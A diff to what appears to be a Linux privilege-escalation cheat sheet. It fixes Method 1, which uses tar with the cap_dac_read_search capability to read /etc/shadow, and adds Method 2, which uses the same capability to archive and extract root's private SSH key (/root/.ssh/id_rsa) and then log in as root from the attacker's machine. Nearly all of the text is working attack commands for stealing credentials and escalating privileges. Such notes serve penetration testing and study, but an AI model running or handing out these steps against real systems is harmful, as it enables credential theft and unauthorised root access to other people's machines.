@@ -812,6 +812,7 @@ id && whoami
 
 Tar
 
+Method 1
 ```
 Victim
 
@@ -819,7 +820,7 @@ getcap -r / 2>/dev/null
 /usr/bin/tar = cap dac read search+ep
 /usr/bin/tar -cvf shadow.tar /etc/shadow
 /usr/bin/tar -xvf shadow.tar
-cat etc/passwd
+cat etc/shadow
 Copy content of users accounts to a local file called shadow
 
 Attacker
@@ -831,6 +832,25 @@ Victim
 
 su root
 id && whoami
+```
+Method 2
+
+```
+Victim
+
+getcap -r / 2>/dev/null         
+/usr/bin/tar = cap dac read search+ep
+/usr/bin/tar -cvf key.tar /root/.ssh/id_rsa
+/usr/bin/tar -xvf key.tar
+cat id_rsa
+# Download id_rsa to attacker machine
+
+Attacker
+
+chmod 600 id_rsa
+ssh -i id_rsa root@<victim_ip>
+id && whoami
+
 ```
 
 OpenSSL
